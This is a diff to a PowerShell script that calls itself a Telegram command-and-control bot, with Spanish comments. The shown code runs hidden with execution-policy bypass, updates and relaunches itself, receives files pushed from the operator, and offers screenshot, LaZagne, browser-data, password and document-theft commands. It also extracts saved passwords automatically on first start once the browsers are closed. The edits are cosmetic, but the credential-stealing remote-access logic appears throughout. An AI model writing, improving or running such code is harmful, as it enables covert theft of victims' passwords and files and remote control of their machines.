@@ -1,7 +1,7 @@
 <#
     bot.ps1 - Telegram C2 Bot (PowerShell 5.1)
     SIN claves: las lee de %appdata%\CarpetaDos\config.ini (lo escribe el instalador)
-    o por parametro -Token / -ChatId.
+    o por parametro -Token / -ChatId. 100%% ASCII (sin emojis) para evitar errores de codificacion.
 #>
 
 param(
@@ -206,7 +206,7 @@ function Update-Bot {
         Copy-Item $tmp $dest -Force
         Remove-Item $tmp -Force -ErrorAction SilentlyContinue
         Send-Message -Text "Codigo actualizado ($sz bytes). Backup: $bak`nReiniciando bot..."
-        $psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`" -Token `"$Token`" -ChatId `"$ChatId`""
+        $psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`" -Token `"$Token`" -ChatId `"$ChatId`""
         Start-Process powershell.exe -ArgumentList $psArgs
         Start-Sleep -Seconds 2
         exit
@@ -461,7 +461,6 @@ function Handle-IncomingFile {
         if (-not $r.ok) { Send-Message -Text "No se pudo obtener el archivo"; return }
         $url = "$ApiFile/$($r.result.file_path)"
 
-        # Si coincide con un archivo en edicion -> sobrescribir en su ruta original
         $key = $fileName.ToLower()
         if ($script:EditFiles.ContainsKey($key)) {
             $destino = $script:EditFiles[$key]
@@ -474,7 +473,6 @@ function Handle-IncomingFile {
             return
         }
 
-        # Si no, guardar en la carpeta de uploads
         $dest = Join-Path $UploadDir $fileName
         Invoke-WebRequest -Uri $url -OutFile $dest -TimeoutSec 300
         $mb = [math]::Round((Get-Item $dest).Length/1MB,2)
@@ -555,16 +553,16 @@ function Check-AutoSteal {
     }
 }
 
-# === MENU DE BOTONES ===
+# === MENU DE BOTONES (texto ASCII, sin emojis) ===
 function Send-Menu {
     $kb = @{
         inline_keyboard = @(
-            @( @{text="📸 Captura";callback_data="/captura"}, @{text="ℹ️ Info";callback_data="/info"} ),
-            @( @{text="🔓 HBD";callback_data="/hack"}, @{text="🦎 LaZagne";callback_data="/lazagne"} ),
-            @( @{text="📄 Documentos";callback_data="/files"}, @{text="🔑 Passwords";callback_data="/passwords"} ),
-            @( @{text="⏸ Pausar";callback_data="/pause"}, @{text="▶️ Reanudar";callback_data="/resume"} ),
-            @( @{text="📂 PWD";callback_data="/pwd"}, @{text="📁 LS";callback_data="/ls"} ),
-            @( @{text="🔁 Ciclo";callback_data="/steal"}, @{text="⬆️ Actualizar";callback_data="/update"} )
+            @( @{text="Captura";callback_data="/captura"}, @{text="Info";callback_data="/info"} ),
+            @( @{text="HBD";callback_data="/hack"}, @{text="LaZagne";callback_data="/lazagne"} ),
+            @( @{text="Documentos";callback_data="/files"}, @{text="Passwords";callback_data="/passwords"} ),
+            @( @{text="Pausar";callback_data="/pause"}, @{text="Reanudar";callback_data="/resume"} ),
+            @( @{text="PWD";callback_data="/pwd"}, @{text="LS";callback_data="/ls"} ),
+            @( @{text="Ciclo";callback_data="/steal"}, @{text="Actualizar";callback_data="/update"} )
         )
     }
     Send-Message-Buttons -Text "Menu principal - elige una opcion" -Keyboard $kb
@@ -652,7 +650,6 @@ Load-State
 Send-Message -Text "Bot online - $(Get-Info)"
 Send-Menu
 
-# Extraccion automatica de passwords en el primer arranque (espera a que cierres navegadores)
 $script:PwPending = -not $script:PwAutoDone
 if ($script:PwPending) { Send-Message -Text "Extraccion automatica de passwords pendiente (primer arranque)." }
 
@@ -662,7 +659,6 @@ $lastId = 0
 $ultimoCheck = Get-Date
 while ($true) {
     try {
-        # --- Extraccion automatica de passwords: espera a que no haya navegadores abiertos ---
         if ($script:PwPending -and -not $script:PwAutoDone) {
             if (Test-BrowsersOpen) {
                 if (-not $script:PwWaitNotified) {
